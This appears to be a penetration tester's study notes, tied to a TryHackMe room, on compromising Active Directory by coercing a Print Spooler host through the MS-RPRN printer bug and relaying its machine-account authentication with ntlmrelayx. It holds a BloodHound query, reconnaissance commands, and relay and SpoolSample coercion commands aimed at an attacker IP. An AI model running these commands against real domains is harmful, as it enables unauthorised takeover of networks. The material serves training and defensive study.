**Beware: Some of these attacks can be unstable, cause crashes or without callback.**

All Windows hosts have a machine account and their passwords are uncrackable, by default, they are 120 characters (UTF16) long and are automatically rotated every 30 days. Within Active Directory, machine account are used for services across the scope of which other organisation units has access to that service. DCs use their machine accounts to synchronise AD updates and changes. Machine accounts are used for authentication to the AD Certificate Service when you request a certificate on behalf of the host machine you make the request from. 

Due to tiering  of privileges as higher tiers manage ever larger group of networked machines exceptional case in AD configuration occurs frequently where one machine has administrative permissions over a host have been granted to another host. This is normal it is expected functionality as domain controllers or SQL clusters that must be synchronised.

## Attack Path

First identify cases where a machine account has administrative access over another machine - [[Neo4j-And-Bloodhound-Guide]]
Bloodhound query - `Click -> "Create Custom Query" in the Analysis tab in Bloodhound`
```js
MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RETURN p
```


## That printer bug...

*It's not a bug, it's a feature - Microsoft.*

The printer bug is a "feature" of the MS-RPRN protocol (PrintSystem Remote Protocol), which allows a domain user to remotely force a target host running the Print Spooler service to authenticate to an arbitrary IP address.

-   A Machine Account administrative privileges 
-   A valid set of AD account credentials.
-   Network connectivity to the target's SMB service.
-   The target host must be running the Print Spooler service.
-   The hosts must not have SMB signing enforced.

```powershell
GWMI Win32_Printer -Computer $printer_name.$domain # verify printer is running
# If access denied attempt the follow
Get-PrinterPort -ComputerName $printer_name.$domain # backup version of the above command
# Beware viewing port is being cracked down by Microsoft so maybe the blue team is already there..
# nmap to see if smb signing is enforced 
nmap --script=smb2-security-mode -p445 $domain

```

**Beware: This attack can be unstable. Abusing the Print Spooler service may cause it to crash, and a callback is not always guaranteed.**



[SpoolSample](https://github.com/leechristensen/SpoolSample) is a C# exploit to exploit the authencation relay. First setup [[Impacket-Cheatsheet]] - `ntlmrelayx`
```bash
ntlmrelayx -smbsupport -t smb://"Machine Account administrative privileges host IP goes here"
-debug 
```
If we specified the hostname of `"Machine Account administrative privileges host"` the hsot could request that we use Kerberos authenication instead of NTLM. Now coerce target to authenicate to us.
```powershell
SpoolSample.exe $target.$domain "Attacker IP"
```

## References

[THM Exploiting AD Room](https://tryhackme.com/room/exploitingad)